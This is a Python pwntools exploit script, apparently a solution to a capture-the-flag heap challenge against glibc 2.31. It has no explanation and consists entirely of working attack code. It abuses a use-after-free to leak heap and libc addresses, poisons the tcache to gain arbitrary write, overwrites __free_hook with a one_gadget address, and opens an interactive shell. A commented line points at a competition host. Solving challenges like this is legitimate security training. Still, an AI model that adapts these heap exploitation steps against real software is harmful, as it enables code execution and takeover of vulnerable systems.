from pwn import *

p = process('./chal')
# p = remote('cha.hackpack.club', 41705)
elf = ELF('./chal')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so')


def choice(id_):
    p.recvuntil(b':')
    p.sendline(id_)


def add(id_, name_, num):
    choice(b'1')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(name_)
    p.recvuntil(b':')
    p.sendline(num)


def delete(id_):
    choice(b'2')
    p.recvuntil(b':')
    p.sendline(id_)


def edit(id_, num):
    choice(b'3')
    p.recvuntil(b':')
    p.sendline(id_)
    p.recvuntil(b':')
    p.sendline(num)


def show(id_):
    choice(b'4')
    p.recvuntil(b':')
    p.sendline(id_)


[add(str(i), b'a', b'12') for i in range(10)]
[delete(str(i)) for i in range(9)]
delete(b'7')
# add(b'0', b'chunk0', b'1234')
# add(b'1', b'chunk1', b'1234')
# add(b'2', b'chunk2', b'1234')
# delete(b'0')
# delete(b'1')
show(b'1')
p.recv()
heap_addr = u64(p.recv(6).ljust(8, b'\00'))
print(hex(heap_addr))
chunk_list = heap_addr - 0x3b0 + 0x2c0
heap_base = heap_addr - 0x3b0 + 0x10
unsorted_chunk = heap_addr - 0xb0
print(hex(heap_base))
print(hex(unsorted_chunk))
[add(b'1', b'a', b'12') for i in range(7)]
add(b'1', p64(chunk_list), b'12')
add(b'0', b'chunk0', b'1234')
add(b'1', b'chunk1', b'1234')
add(b'2', p64(heap_base), b'1234')
edit(b'4', b'458752')
edit(b'2', str(unsorted_chunk))
delete(b'6')
show(b'6')
p.recv()
main_area = u64(p.recv(6).ljust(8, b'\00'))
print(main_area)
malloc_hook = main_area - 96 - 0x10
base_addr = malloc_hook - lib.sym['__malloc_hook']
free_hook = base_addr + lib.sym['__free_hook']
print(hex(malloc_hook))
edit(b'2', str(free_hook - 0x10))
key = [0xe6aee, 0xe6af1, 0xe6af4]
one_gadget = base_addr + key[1]
edit(b'6', str(one_gadget))
delete(b'0')
# gdb.attach(p)
p.interactive()
